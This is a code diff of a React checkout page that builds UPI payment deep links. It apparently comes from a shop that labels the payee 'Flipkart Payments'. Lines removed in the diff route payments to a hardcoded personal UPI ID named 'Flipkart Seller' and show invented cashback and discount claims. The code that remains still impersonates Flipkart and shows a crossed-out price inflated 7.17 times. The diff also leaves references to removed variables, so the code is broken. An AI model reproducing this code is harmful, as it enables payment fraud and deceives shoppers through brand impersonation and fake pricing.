@@ -64,7 +64,6 @@ export default function Payments() {
                 setProducts(p => ({ ...p, ...upi }));
                 if      (data.data?.payment?.cashfreeEnabled) setActiveTab(6);
                 else if (upi.Phonepe !== false)               setActiveTab(3);
-                else if (upi.Phonepe2)                        setActiveTab(7);
                 else if (upi.Gpay    !== false)               setActiveTab(2);
                 else if (upi.Paytm   !== false)               setActiveTab(4);
                 else                                          setActiveTab(1);
@@ -79,8 +78,7 @@ export default function Payments() {
                 2: "GPay",
                 3: "PhonePe",
                 4: "Paytm Native",
-                6: "Card / Net Banking",
-                7: "PhonePe 2"
+                6: "Card / Net Banking"
             };
             const cartValue = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
             trackAddPaymentInfo(methodNames[activeTab] || "UPI", cartValue);
@@ -91,22 +89,12 @@ export default function Payments() {
     const totalMrp      = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
     const itemCount     = cart.reduce((s,p) => s + (p.quantity||1), 0);
     const crossedMrp    = Math.round(totalMrp * 7.17);
-    const cashback      = Math.round(totalMrp * 0.4);
 
     /* ── UPI deep-links ── */
     useEffect(() => {
         if (!mounted || !activeTab || !orderId || activeTab === 6) { setPayUrl(""); return; }
         const amt = totalMrp;
         const txn = `TXN${Date.now()}`;
-
-        if (activeTab === 7) {
-            const p2Name = encodeURIComponent(products.Phonepe2Name || "Flipkart Seller");
-            const p2Upi = products.Phonepe2UpiId || "shivfashion710704.rzp@rxairtel";
-            const p2Txn = `TD${Date.now()}`;
-            const phonepe2Url = `phonepe://pay?pa=${p2Upi}&pn=${p2Name}&am=${amt}&tr=${p2Txn}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${orderId}`;
-            setPayUrl(phonepe2Url);
-            return;
-        }
 
         if (!products?.id) { setPayUrl(""); return; }
         const id = products.id;
@@ -124,7 +112,7 @@ export default function Payments() {
             },
             contact: {
                 type: "EXTERNAL_MERCHANT",
-                name: products.Phonepe2Name || "Flipkart Payments",
+                name: "Flipkart Payments",
                 vpa: id
             }
         };
@@ -143,7 +131,7 @@ export default function Payments() {
             },
             contact: {
                 type: "EXTERNAL_MERCHANT",
-                name: products.Phonepe2Name || "Flipkart Payments",
+                name: "Flipkart Payments",
                 vpa: id
             }
         };
@@ -156,7 +144,7 @@ export default function Payments() {
             4: paytmLink,
         };
         setPayUrl(urls[activeTab] || "");
-    }, [activeTab, products?.id, products?.Phonepe2UpiId, products?.Phonepe2Name, totalMrp, mounted, orderId]);
+    }, [activeTab, products?.id, totalMrp, mounted, orderId]);
 
     const handlePay = async () => {
         if (activeTab === 6) {
@@ -200,7 +188,7 @@ export default function Payments() {
                 items: cart,
                 total: totalMrp,
                 shippingAddress: user,
-                paymentMethod: activeTab === 1 ? "BHIM" : activeTab === 2 ? "GPay" : activeTab === 3 ? "PhonePe" : activeTab === 4 ? "Paytm" : activeTab === 7 ? "PhonePe 2" : "UPI",
+                paymentMethod: activeTab === 1 ? "BHIM" : activeTab === 2 ? "GPay" : activeTab === 3 ? "PhonePe" : activeTab === 4 ? "Paytm" : "UPI",
                 date: new Date().toISOString(),
             };
             localStorage.setItem("lastOrder", JSON.stringify(orderDetails));
@@ -222,7 +210,6 @@ export default function Payments() {
 
     const show = {
         phonepe:  products.Phonepe  !== false,
-        phonepe2: !!products.Phonepe2,
         gpay:     products.Gpay     !== false,
         paytm:    products.Paytm    !== false,
         bhim:     products.Bhim     !== false,
@@ -231,7 +218,7 @@ export default function Payments() {
 
     // Helper to get active payment color theme
     const getThemeColor = () => {
-        if (activeTab === 3 || activeTab === 7) return "#5f259f"; // PhonePe Purple
+        if (activeTab === 3) return "#5f259f"; // PhonePe Purple
         if (activeTab === 2) return "#1a73e8"; // GPay Blue
         if (activeTab === 4) return "#00baf2"; // Paytm Cyan
         if (activeTab === 1) return "#f97316"; // BHIM Orange
@@ -448,31 +435,6 @@ export default function Payments() {
                 .sub-bhim    { color:#ea580c; }
                 .sub-cashfree{ color:#334155; }
 
-                /* ── CASHBACK BANNER ── */
-                .cashback-banner {
-                    background:#f0fdf4;
-                    border:1px solid #dcfce7;
-                    border-radius:12px;
-                    padding:16px;
-                    margin-bottom:16px;
-                }
-                .cb-title {
-                    font-family:'Outfit', sans-serif;
-                    font-size:16px;
-                    font-weight:700;
-                    color:#15803d;
-                    margin-bottom:4px;
-                    display:flex;
-                    align-items:center;
-                    gap:6px;
-                }
-                .cb-body {
-                    font-size:13px;
-                    line-height:1.5;
-                    color:#334155;
-                }
-                .cb-bold { font-weight:700; color:#1e293b; }
-
                 /* ── PRICE SUMMARY ── */
                 .price-box {
                     background:#fff;
@@ -648,9 +610,9 @@ export default function Payments() {
                         <div className="upi-sec-hdr">
                             <div className="upi-sec-hdr-left">
                                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#0f172a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
-                                <p className="upi-sec-label">Pay via UPI App</p>
+                                <p className="upi-sec-label">UPI Payment Options</p>
                             </div>
-                            <span style={{fontSize:12, color:"#94a3b8", fontWeight:700}}>ONLINE UPI</span>
+                            <span style={{fontSize:12, color:"#94a3b8", fontWeight:700}}>Secure UPI</span>
                         </div>
 
                         <div className="upi-opts-card">
@@ -668,7 +630,7 @@ export default function Payments() {
                                                 <span className="pmt-pipe">|</span>
                                                 <span>PhonePe</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-phonepe">30% Extra Discount By PhonePe</p>
+                                            <p className="pmt-opt-sub sub-phonepe">Use PhonePe UPI</p>
                                         </div>
                                     </div>
                                     <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
@@ -677,7 +639,7 @@ export default function Payments() {
                                 </div>
                             )}
 
-                            {/* PhonePe 2 */}
+                            {/* GPay */}
                             {show.phonepe2 && (
                                 <div className={`pmt-opt ${activeTab===7 ? 'active-opt' : ''}`} onClick={() => setActiveTab(7)} style={{"--theme-color": "#5f259f"}}>
                                     <div className="pmt-opt-left">
@@ -690,7 +652,7 @@ export default function Payments() {
                                                 <span className="pmt-pipe">|</span>
                                                 <span>{products.Phonepe2Name || "PhonePe"}</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-phonepe">30% Extra Discount By PhonePe</p>
+                                            <p className="pmt-opt-sub sub-phonepe">Use PhonePe UPI</p>
                                         </div>
                                     </div>
                                     <img src="/assets/images/phonepe.svg" alt="PhonePe" width={28} height={28}
@@ -712,7 +674,7 @@ export default function Payments() {
                                                 <span className="pmt-pipe">|</span>
                                                 <span>GPay</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-gpay">20% Extra Discount By GPay</p>
+                                            <p className="pmt-opt-sub sub-gpay">Use Google Pay UPI</p>
                                         </div>
                                     </div>
                                     <img src="/assets/images/gpay_icon.svg" alt="GPay" width={28} height={28}
@@ -734,10 +696,10 @@ export default function Payments() {
                                                 <span className="pmt-pipe">|</span>
                                                 <span>PayTM</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-paytm">10% Extra Discount By Paytm</p>
+                                            <p className="pmt-opt-sub sub-paytm">Use Paytm UPI</p>
                                         </div>
                                     </div>
-                                    <img src="/assets/images/paytm_icon.svg" alt="Paytm" width={32} height={32}
+                                    <img src="/assets/images/PAYTM.NS_BIG.svg" alt="Paytm" width={45} height={32}
                                         onError={e=>{e.target.outerHTML='<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#00baf2"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">PayTM</text></svg>';}}
                                     />
                                 </div>
@@ -756,7 +718,7 @@ export default function Payments() {
                                                 <span className="pmt-pipe">|</span>
                                                 <span>BHIM UPI</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-bhim">Direct Bank Transfer</p>
+                                            <p className="pmt-opt-sub sub-bhim">Pay using BHIM or UPI apps.</p>
                                         </div>
                                     </div>
                                     <img src="https://upload.wikimedia.org/wikipedia/en/b/b3/Bhim_logo.png" alt="BHIM" width={28} height={28}
@@ -778,7 +740,7 @@ export default function Payments() {
                                                 <span className="pmt-pipe">|</span>
                                                 <span>Card / Net Banking</span>
                                             </div>
-                                            <p className="pmt-opt-sub sub-cashfree">Secured by Cashfree</p>
+                                            <p className="pmt-opt-sub sub-cashfree">Card / Net Banking via Cashfree.</p>
                                         </div>
                                     </div>
                                     <svg width="52" height="22" viewBox="0 0 120 40">
@@ -793,18 +755,6 @@ export default function Payments() {
 
                         </div>{/* upi-opts-card */}
                     </div>{/* upi-section */}
-
-                    {/* ── CASHBACK BANNER ── */}
-                    <div className="cashback-banner">
-                        <div className="cb-title">
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5 12 2"></polygon><line x1="12" y1="22" x2="12" y2="15.5"></line><polyline points="22 8.5 12 15.5 2 8.5"></polyline><polyline points="2 15.5 12 8.5 22 15.5"></polyline><line x1="12" y1="2" x2="12" y2="8.5"></line></svg>
-                            Cashback on First Order!
-                        </div>
-                        <div className="cb-body">
-                            Place your order and get <span className="cb-bold">₹{cashback}</span> cashback!
-                            Cashback will be automatically credited to your original UPI account after successful delivery.
-                        </div>
-                    </div>
 
                     {/* ── PRICE SUMMARY ── */}
                     <div className="price-box">
